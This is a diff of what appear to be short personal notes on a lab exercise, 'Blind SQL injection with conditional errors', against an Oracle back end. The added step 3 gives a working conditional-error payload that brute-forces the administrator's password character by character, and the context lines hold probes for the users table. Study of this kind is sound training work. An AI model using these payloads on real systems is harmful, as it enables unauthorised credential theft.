@@ -1,4 +1,4 @@
-# Lab 12 - Blind SQL injection with conditional errors
+![image](https://github.com/user-attachments/assets/51c33d60-b91c-43af-b8a1-7e9dcd6f123c)# Lab 12 - Blind SQL injection with conditional errors
 
 since this oracle database we will use different information sechame and operators
 
@@ -15,3 +15,8 @@ we have no error
 then 
 ' || (select '' from users where username='administrator') || ' 
 there's no error
+
+##  3) bruteforce the password character by character 
+3'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+![image](https://github.com/user-attachments/assets/846b2816-119f-4bf7-b615-9175819904f8)
